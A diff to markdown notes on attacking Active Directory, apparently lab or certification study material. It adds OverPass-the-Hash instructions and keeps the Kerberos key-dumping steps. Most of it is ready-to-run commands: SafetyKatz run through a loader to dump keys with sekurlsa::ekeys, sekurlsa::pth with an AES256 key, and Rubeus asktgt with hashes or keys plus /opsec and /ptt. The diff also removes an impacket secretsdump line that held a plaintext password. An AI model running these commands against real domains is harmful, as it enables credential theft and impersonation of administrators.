@@ -9,14 +9,33 @@ mimikatz.exe -Command '"sekurlsa::ekeys"'
 
 Using SafetyKatz (Minidump of lsass and PELoader to run mimikatz)
 ```powershell
-SafetyKatz.exe "sekurlsa::ekeys"
+Loader.exe SafetyKatz.exe "sekurlsa::ekeys"
 ```
 
-From a Linux attacking machine using `impacket`
-```bash
-impacket-secretsdump dcorp/student548:'P@ss123!'@172.16.42.10
+### OverPass-The-Hash
+Over Pass the hash (OPTH) generate tokens from hashes or keys - Kerberos only
+
+> [!NOTE] **NOTE**
+> Difference between `PTH` and `OPTH` is PTH` `uses local users and `OPTH` uses a domain users credentials to generate tickets and run processes in their context
+
+Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs
+elevation 
+```powershell
+Loader.exe SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local/aes256:<aes256keys> /run:cmd.exe" "exit"
 ```
 
+The above commands starts a process with a logon type 9 (same as runas
+/netonly). This means that if you run a `whoami` it will still show as the low priv user, but when you access domain resources it will use the domain administrator credentials.
+
+Rubeus (does not need elevation)
+```powershell
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+```
+
+Elevation required
+```powershell
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
 
 
 Local Security Authority (`LSA`) is responsible for authentication on a Windows
